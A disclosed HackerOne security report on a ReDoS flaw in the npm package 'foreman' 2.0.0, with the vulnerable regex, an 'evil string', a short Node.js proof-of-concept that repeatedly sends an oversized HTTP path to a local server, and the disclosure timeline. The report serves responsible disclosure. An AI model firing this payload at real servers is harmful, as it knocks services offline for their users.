---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/uncontrolled-resource-consumption
  - env/web
  - stack/node
  - vuln/dos
substate: "resolved"
weakness: "Uncontrolled Resource Consumption"
enriched: true
body: true
date: 2018-04-28
submitted: 2018-02-28T03:13:44.212Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "chalker"
source: "https://hackerone.com/reports/320586"
title: "`foreman` is vulnerable to ReDoS in path"
---
# `foreman` is vulnerable to ReDoS in path

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 3 | **Program:** Node.js third-party modules | **Disclosed:** 2018-04-28

- Report: [https://hackerone.com/reports/320586](https://hackerone.com/reports/320586)
- CWE: Uncontrolled Resource Consumption
- Submitted: 2018-02-28T03:13:44.212Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report ReDoS in `foreman`.
It allows to cause denial of service by suppling a crafted path.

# Module

**module name:** foreman
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/foreman`

## Module Description

> Node Foreman is a Node.js version of the popular Foreman tool, with a few Node specific changes.

## Module Stats

5 296 downloads in the last day
30 879 downloads in the last week
141 342 downloads in the last month

~1 696 104 estimated downloads per year

# Vulnerability

## Vulnerability Description

ReDoS.

Regex: `/http:\/\/[^/]*:?[0-9]*(\/.*)$/`
Evil string: `http://${Array(81000).join('0')}` (unwrap js template)
Line: https://github.com/strongloop/node-foreman/blob/v2.0.0/forward.js#L30
Blocks for ~5 seconds per request.

## Steps To Reproduce:

`nf start -f 9999`

```js
const net = require('net');
const tick = function() {
const client = net.createConnection({ port: 9999 }, () => {
  client.write(`GET http://${Array(81000).join('0')} HTTP/1.1
Host: localhost:9999


"`);
  });
}
setInterval(tick, 1000)
```

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of Service by passing crafted paths.

## Timeline

- **Report Filed**
- **2018-02-28** @chalker: I suggest cc-ing @davisjam.
- **Report Triaged**
- **2018-04-05** @lirantal: Thanks @chalker and @davisjam,

I confirm the vulnerability and have invited maintainers from Strongloop and the foreman project to help triage and discuss the fix.
- **2018-04-24** @lirantal: @chalker @davisjam no update from the authors.
are you both ok with moving forward with the report disclosure?
- **2018-04-27** @chalker: Package looks dead and unsupported. I am fine with disclosing this if the maintainers could not be reached.
- **2018-04-28** @lirantal: Will continue with a full public disclosure
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **Changed Scope**
- **External User Joined**
